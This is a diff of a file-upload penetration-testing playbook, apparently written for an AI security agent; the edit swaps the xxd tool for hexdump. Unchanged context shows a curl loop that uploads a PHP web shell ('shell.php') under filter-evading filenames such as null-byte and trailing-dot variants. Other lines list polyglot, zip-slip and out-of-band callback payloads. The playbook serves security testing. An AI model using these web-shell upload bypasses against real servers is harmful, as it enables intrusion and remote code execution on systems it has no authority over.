@@ -39,7 +39,7 @@ This workflow uses only tools already present in the agent runtime. No new Kali 
 
 - `query_graph` to inventory upload endpoints, MIME hints, parameters, and known technologies from prior recon
 - `execute_curl` for crafted multipart bodies, presigned PUT/POST flows, header rotation, and follow-up GETs against the served file
-- `kali_shell` for one-off CLI tasks: `xxd` for magic-byte inspection, `zip` for archive crafting, `printf` for binary header injection, `interactsh-client` for OOB callbacks, `jq` for JSON inspection, `dig` for DNS callback verification
+- `kali_shell` for one-off CLI tasks: `hexdump -C` for magic-byte inspection, `zip` for archive crafting, `printf` for binary header injection, `interactsh-client` for OOB callbacks, `jq` for JSON inspection, `dig` for DNS callback verification
 - `execute_code` (Python) for byte-level payload crafting (magic-byte spoofing, polyglot construction, OOXML / ODT repackaging, EXIF / XMP injection, zip-slip and symlink-in-zip generation, EICAR variants, presigned URL signing tests) and for orchestrating multi-step upload-then-fetch loops
 - `execute_playwright` to capture authenticated cookies / CSRF tokens from real upload UIs when the API path is opaque, and to confirm browser-side behaviour (inline render vs. attachment) on the served URL
 - `execute_nuclei` for opportunistic checks against published upload-handler templates after a candidate endpoint is identified
@@ -167,7 +167,7 @@ done
 ```bash
 # Unicode dot, trailing dot, trailing space, null-byte (legacy stacks)
 for name in 'shell.php%00.png' 'shell.php.' 'shell.php ' 'shell.php\u200d' 'shell.php\x00.jpg' 'shell..php' 'shell%2ephp'; do
-  printf '%s' "$name" | xxd
+  printf '%s' "$name" | hexdump -C
   curl -sk -X POST "https://<target>/api/upload" \
     -H "Authorization: Bearer $TOKEN" \
     -F "file=@/tmp/shell.php;filename=$name;type=image/png"
@@ -204,7 +204,7 @@ Send each polyglot through the upload flow with the extension and `Content-Type`
 ```bash
 # Validate magic bytes survived the pipeline
 curl -sk "https://<served-url>" -o /tmp/served.bin
-xxd /tmp/served.bin | head -3
+hexdump -C /tmp/served.bin | head -3
 ```
 
 #### 2.4 Config drops (Apache, PHP-FPM, IIS, .NET)
